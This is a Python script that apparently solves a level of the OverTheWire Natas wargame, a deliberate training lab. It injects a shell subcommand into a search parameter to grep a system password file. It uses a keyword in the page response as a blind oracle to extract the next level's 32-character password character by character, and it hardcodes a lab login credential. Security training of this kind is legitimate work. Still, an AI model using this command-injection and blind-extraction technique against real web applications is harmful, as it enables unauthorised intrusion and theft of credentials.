import requests

url='http://natas16.natas.labs.overthewire.org/?needle='
payload='africans$(grep '
end=' /etc/natas_webpass/natas17)'
letters='abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
dictionary=''

for letter in letters:
    request = url + payload + letter + end
    response = requests.get(request, auth=auth)

    if 'Africans' not in response.text:
        dictionary += letter
        print('Dictionary: ' + dictionary)

password = ''

while(len(password) != 32):
    for letter in dictionary:
        request = url + payload + '^' + password + letter + end
        response = requests.get(request, auth=auth)

        if 'Africans' not in response.text:
            password += letter
            print('Length: ' + str(len(password)) + ' -> ' + password)
            break
